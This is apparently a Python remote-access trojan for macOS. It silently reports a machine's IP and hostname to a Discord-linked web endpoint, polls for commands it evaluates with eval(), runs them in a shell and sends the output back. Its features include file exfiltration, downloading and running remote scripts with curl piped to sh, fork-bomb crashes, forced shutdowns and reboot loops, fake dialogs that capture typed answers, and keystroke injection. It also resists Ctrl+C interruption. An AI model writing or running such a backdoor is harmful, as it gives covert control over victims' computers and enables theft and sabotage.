try:
    from os import system as ossystem
    from requests import get, post
    from time import sleep
    from subprocess import Popen as system
    from subprocess import PIPE
    from os import chdir, uname, devnull, getcwd
    from sys import platform, stdout, stderr

    old_command = ""
    command = ""
    loop = 0
    

    stdout = open(devnull, 'w')
    stderr = open(devnull, 'w')

    ip = get('https://api.ipify.org').content.decode('utf8')
    hostname = uname()[1]
    post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"New client IP: `{ip}@{hostname}`")
except KeyboardInterrupt:
    try:
        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``Client tried to SIGINT(Ctrl+C) when init``")
        pass
    except KeyboardInterrupt:
        pass
    pass

while True:
    # prevent keyboardinterrupt
    try:
        ossystem("/usr/sbin/networksetup -setairportpower en0 on")
    except:
        continue
    try:
        #get HTML
        try:
            commandGet = eval(get("https://discord-bot-command-inputter-littleblack111.vercel.app").content.decode())
            commandId = commandGet[0]
            command = commandGet[1]
            if command.startswith('Error: 429'):
                try:
                    sleep(5)
                    continue
                except KeyboardInterrupt:
                    post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when waiting discord api timeout(rate-limit)``")
        except KeyboardInterrupt:
            try:
                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when handling discord api``")
            except KeyboardInterrupt:
                ossystem("/usr/sbin/networksetup -setairportpower en0 on")
                continue
            continue
        except:
            ossystem("/usr/sbin/networksetup -setairportpower en0 on")
            sleep(3)
            continue
        localcmd = None
        if old_command != commandId:
            try:
                if command == "":
                    old_command = ""
                    if loop == 1:
                        loop = 0
                        pass
                    else:
                        loop = 1
                        continue
                if command == "None":
                    old_command = ""
                    continue
                if command.startswith("get "):
                    localcmd = command.split()
                    path = localcmd[1]
                    try:
                        open("output.txt", 'wb').write(open(str("../"+path), 'r').read())
                        file = [str(path), open("output.txt", 'r').read()]
                    except UnicodeDecodeError:
                        open("output.txt", 'wb').write(open(str("../"+path), 'rb').read())
                        file = [str(path), open("output.txt", 'rb').read()]
                    file = "FILE " + str(file)
                    try:
                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data = file)
                    except:
                        pass
                    old_command = commandId
                    continue
                if command.startswith("webfile "):
                    localcmd = command.split(maxsplit=1)
                    files = eval(localcmd[1])
                    for fileUrl in files:
                        fileData = get(fileUrl).content
                        fileName = path.basename(fileUrl)
                        filePath = expanduser("~")
                        with open(f"{filePath}/{fileName}", 'wb') as f:
                            f.write(fileData)
                            f.close()
                    old_command = commandId
                    continue
                    #filename = os.path.basename(localcmd[1])
                    #print(filename)
                    #ossystem("touch " + filename[0] + filename[1])
                if command.startswith("exename "):
                    localcmd = command.split()
                    if localcmd[1] == hostname:
                        del localcmd[0]
                        del localcmd[0]
                        localcmd = ' '.join(localcmd)
                        print(localcmd)
                    else:
                        old_command = commandId
                        continue
                if command.startswith("exeos "):
                    localcmd = command.split()
                    if localcmd[1] == platform:
                        del localcmd[0]
                        del localcmd[0]
                        localcmd = ' '.join(localcmd)
                    else:
                        old_command = commandId
                        continue
                if command.startswith("exeip "):
                    localcmd = command.split()
                    if localcmd[1] == ip:
                        del localcmd[0]
                        del localcmd[0]
                        localcmd = ' '.join(localcmd)
                    else: 
                        old_command = commandId
                        continue
                if command.startswith("crash"):
                   from os import fork
                   command = command.split()
                   if command[1<len(command)]:
                       for _ in range(command[1]):
                           fork()
                   else:
                       while 1:
                           fork()
                elif command.startswith('volume'):
                    localcmd = command.split()
                    if localcmd[1<len(localcmd)]:
                        try:
                            volumesize = int(localcmd[1])
                            if ossystem(f"osascript -e 'set Volume {volumesize/10}'") == 0:
                                try:
                                    post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }: ``Volume set to {volumesize}``")
                                    old_command = commandId
                                except KeyboardInterrupt:
                                    continue
                                continue
                            else:
                                try:
                                    post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }: ``Volume set ran unsuccesfully``")
                                except KeyboardInterrupt:
                                    continue
                                continue


                        except ValueError:
                            try:
                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }: ``Please enter a volume size``")
                            except KeyboardInterrupt:
                                continue
                            continue
                        except KeyboardInterrupt:
                            try:
                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) while sending error of { ' '.join(str(e) for e in localcmd) }``")
                            except KeyboardInterrupt:
                                continue
                            continue
                elif command.startswith('replacenew') and command.endswith('replacenew'):
                    system('curl -fsSL https://raw.githubusercontent.com/mrdog233o5/remote-control-discord/main/setup.sh | sh', shell=True)
                    from sys import exit
                    exit()
                elif command.startswith('syspower'):
                    localcmd = command.split()
                    if localcmd[1<len(localcmd)] and not path.exists(f"{expanduser('~')}/.syspower"):
                        try:
                            if localcmd[1] == 'shutdown' or localcmd[1] == 'poweroff':
                                if ossystem('osascript -e \'tell app "Finder" to shut down\'') == 0:
                                    try:
                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```computer shutting down, bye...```")
                                        old_command = commandId
                                    except:
                                        try:
                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to shutdown```")
                                        except KeyboardInterrupt:
                                            continue
                                        continue
                                else:
                                    try:
                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to start shutting down```")
                                    except KeyboardInterrupt:
                                        continue
                                    continue

                            elif localcmd[1] == 'restart' or localcmd[1] == 'reboot':
                                if ossystem('osascript -e \'tell app "Finder" to restart\'') == 0:
                                    try:
                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```computer rebooting, cya...```")
                                        old_command = commandId
                                    except:
                                        try:
                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to start rebooting```")
                                        except KeyboardInterrupt:
                                            continue
                                        continue
                                else:
                                    try:
                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to start rebooting```")
                                    except KeyboardInterrupt:
                                        continue
                                    continue

                            elif localcmd[1] == 'sleep' or localcmd[1] == 'suspend' or localcmd[1] == 'pause':
                                if ossystem('osascript -e \'tell app "Finder" to sleep\'') == 0:
                                    try:
                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```computer going to sleep, cya...```")
                                        old_command = commandId
                                    except:
                                        try:
                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to start sleeping```")
                                        except KeyboardInterrupt:
                                            continue
                                        continue
                                else:
                                    try:
                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to start sleeping```")
                                    except KeyboardInterrupt:
                                        continue
                                    continue
                            elif localcmd[1] == 'lock' or localcmd[1] == 'lockscreen':
                                if ossystem('osascript -e \'tell application "System Events" to keystroke "q" using {command down, control down}\'') == 0:
                                    try:
                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```computer going to lockscreen, cya...```")
                                        old_command = commandId
                                    except:
                                        try:
                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to start lockingscreen```")
                                        except KeyboardInterrupt:
                                            continue
                                        continue
                                else:
                                    try:
                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to start lockingscreen```")
                                    except KeyboardInterrupt:
                                        continue
                                    continue
                            open(f"{expanduser('~')}/.syspower", 'w').close()

                        except:
                            continue
                    elif localcmd[1<len(localcmd)] and not path.exists(f"{expanduser('~')}/.syspower"):
                        if localcmd[1] == 'keepreboot':
                            if ossystem('osascript -e \'tell app "Finder" to restart\'') == 0:
                                try:
                                    post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```computer gonna be keep rebooting, cya...```")
                                    old_command = commandId
                                except:
                                    try:
                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to start rebooting```")
                                    except KeyboardInterrupt:
                                        continue
                                    continue
                            else:
                                try:
                                    post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to start rebooting```")
                                except KeyboardInterrupt:
                                    continue
                                continue

                    else:
                        remove(expanduser('~')/'.syspower')
                    continue

                elif command.startswith('interact'):
                    localcmd = command.split()
                    if localcmd[1<len(localcmd)]:
#                        try:
#                            if localcmd[1] == 'upload' or localcmd[1] == 'get':
#                                if localcmd[2<len(localcmd)]:
#                                    

                            if localcmd[1] == 'dialog' or localcmd[1] == 'popup' or localcmd[1] == 'dropmenu':
                                if localcmd[2<len(localcmd)]:
                                    if ossystem(f'osascript -e \'display dialog "{localcmd[2]}" buttons "Yes"\'') == 0:
                                        try:
                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Successfully the dialog```")
                                            old_command = commandId
                                        except KeyboardInterrupt:
                                            continue
                                        continue
                                    else:
                                        try:
                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to send dialog```")
                                        except KeyboardInterrupt:
                                            continue
                                        continue
                                else:
                                    try:
                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```You need to pass another argument for infomation in the dialog```")
                                        old_command = commandId
                                    except KeyboardInterrupt:
                                        continue
                                    continue
                            elif localcmd[1] == 'askdialog' or localcmd[1] == 'asklog' or localcmd == 'question':
                                if localcmd[2<len(localcmd)]:
                                    r = system(f'osascript -e \'display dialog "{localcmd[2]}" default answer ""\' -e \'text returned of result\' -e \'\'', shell=True, stdout=PIPE, stderr=PIPE)
                                    cmdout, cmderr = r.communicate()
                                    if r.wait() == 0:
                                        try:
                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```{cmdout.decode()}```")
                                            old_command = commandId
                                        except:
                                            try:
                                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to ask with dialog```")
                                            except KeyboardInterrupt:
                                                continue
                                            continue
                                    else:
                                        try:
                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```{cmderr.decode()}```")
                                        except:
                                            try:
                                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to ask with dialog```")
                                            except KeyboardInterrupt:
                                                continue
                                            continue

                                else:
                                    try:
                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Please do question argument```")
                                    except KeyboardInterrupt:
                                        continue
                                    continue


                                    
                            elif localcmd[1] == 'notify' or localcmd[1] == 'notification':
                                if localcmd[4>len(localcmd)]:
                                    if ossystem(f"osascript -e 'display notification \"{localcmd[2]}\" with title \"{localcmd[3]}\" subtitle \"{localcmd[4]}\"'") == 0:
                                        try:
                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Notified successfully```")
                                            old_command = commandId
                                        except:
                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to notify```")
                                            continue
                                        continue
                                    else:
                                        try:
                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to notify```")
                                        except KeyboardInterrupt:
                                            continue
                                        continue
                                else:
                                    post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```You need to pass three argument in the order of \`content\` \`title\` \`subtitle\`")
                                    old_command = command
                                    continue
                            elif localcmd[1] == 'keyboard' or localcmd[1] == 'type':
                                if localcmd[3<len(localcmd)]:
                                    if localcmd[2] == 'type':
                                        if os.system(f"osascript -e 'tell application \"System Events\" to keystroke \"{ ' '.join(str(e) for e in localcmd[3:]) }\"\'") == 0:
                                            try:
                                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Successfully typed {' '.join(str(e) for e in localcmd[3:])} with keyboard```")
                                                old_command = commandId
                                            except:
                                                continue
                                            continue
                                        else:
                                            try:
                                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to do typing```")
                                            except:
                                                continue
                                            continue
                                    elif localcmd[2] == 'press':
                                        if os.system(f"osascript -e 'tell application \"System Events\" to keystroke { ' '.join(str(e) for e in localcmd[3:]) }\'") == 0:
                                            try:
                                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Successfully pressed {' '.join(str(e) for e in localcmd[3:])} with keyboard```")
                                                old_command = commandId
                                            except:
                                                continue
                                            continue
                                        else:
                                            try:
                                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to do pressing```")
                                            except:
                                                continue
                                            continue
                            elif localcmd[1] == 'quit' or localcmd[1] == 'close':
                                if localcmd[2<len(localcmd)]:
                                    if ossystem(f'osascript -e \'tell app "{localcmd[2]}" to quit\'') == 0:
                                        try:
                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Successfully quitted {localcmd[2]}```")
                                            old_command = commandId
                                        except:
                                            continue
                                        continue
                                    else:
                                        try:
                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to do quitting```")
                                        except:
                                            continue
                                        continue



                                        
                            continue

                        #except:
                            try:
                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed at doing interactive actions```")
                            except KeyboardInterrupt:
                                continue
                            continue


                elif command.startswith('usetool'):
                    localcmd = command.split()
                    if localcmd[1<len(localcmd)]:
                        try:
                            exescript = get(f"https://github.com/littleblack111/remote-control-tools/raw/main/{localcmd[1]}").content.decode()
                            if localcmd[1].endswith(".sh"):
                                r = system(exescript, shell=True, stdout=PIPE, stderr=PIPE)
                                cmdout, cmderr = r.communicate()
                                try:
                                    post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```{cmdout.decode()}```")
                                except:
                                    try:
                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to sent output of usetool```")
                                    except KeyboardInterrupt:
                                        continue
                                    continue
                        except KeyboardInterrupt:
                            try:
                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) while changing directory``")
                            except KeyboardInterrupt:
                                continue
                            continue
                        except Exception as e:
                            try:
                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Failed to get script{e}``")
                            except KeyboardInterrupt:
                                continue
                            continue
                        old_command = commandId
                        continue

#                    try:
#                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: Pong!")
#                    except KeyboardInterrupt:
#                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when replying to ping``")
#                    except:
                        ossystem("/usr/sbin/networksetup -setairportpower en0 on")

#                       continue
                if command.startswith("cd"):
                    dir=command.replace('cd', '')
                    try:
                        chdir(dir)
                    except KeyboardInterrupt:
                        try:
                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) while changing directory``")
                        except KeyboardInterrupt:
                            continue
                        continue
                    except FileNotFoundError:
                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``$ {command}`` ```No Such Directory```-{ip}@{hostname}")
                    except:
                        ossystem("/usr/sbin/networksetup -setairportpower en0 on")

                        continue
                old_command = commandId
                if localcmd:
                    r = system(localcmd, shell=True, stdout=PIPE, stderr=PIPE)
                    cmdout, cmderr = r.communicate()
                else:
                    r = system(command, shell=True, stdout=PIPE, stderr=PIPE)
                    cmdout, cmderr = r.communicate()
                try:
                    if r.returncode != 0:
                        if r.returncode == 127:
                            if localcmd:
                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Error: { ' '.join(str(e) for e in localcmd) }: Command not found```")
                            else:
                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {command}`` ```Error: {command}: Command not found```")
                        else:
                            if localcmd:
                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Error: {cmderr.decode()} exited with code {r.returncode}```- {ip}@{hostname}")
                            else:
                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {command}`` ```Error: {cmderr.decode()} exited with code {r.returncode}```- {ip}@{hostname}")
                    elif r.returncode != 0 and cmdout.decode() == "":
                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {command}`` ```Error: exited with no output and code {r.returncode}```- {ip}@{hostname}")
                except KeyboardInterrupt:
                    try:
                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when trying to post (error)output``")
                    except KeyboardInterrupt:
                            continue
                    continue
                except:
                    ossystem("/usr/sbin/networksetup -setairportpower en0 on")

                    continue
                if cmdout.decode() != "" and cmderr.decode() == "":
                    try:
                        if localcmd:
                             post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```{cmdout.decode()}```")
                        else:
                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {command}`` ```{cmdout.decode()}```")
                    except KeyboardInterrupt:
                        try:
                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when trying to post output``")
                        except KeyboardInterrupt:
                                continue
                        continue
                    except:
                        ossystem("/usr/sbin/networksetup -setairportpower en0 on")

                        continue
                elif cmdout.decode() == "" and cmderr.decode() == "":
                    try:
                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``$ {command}`` ```Command Executed successfully without output```- {ip}@{hostname}")
                    except KeyboardInterrupt:
                        try:
                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when trying to post output``")

                        except KeyboardInterrupt:
                                continue
                        continue
                    except:
                        ossystem("/usr/sbin/networksetup -setairportpower en0 on")

                        continue
                old_command = commandId
                continue
            except:
                continue
        try:
            sleep(0.1)
        except KeyboardInterrupt:
            try:
                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C)``")
            except KeyboardInterrupt:
                continue
            continue
    except KeyboardInterrupt:
        try:
            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C)``")
        except KeyboardInterrupt:
            continue
        continue
    except:
        continue
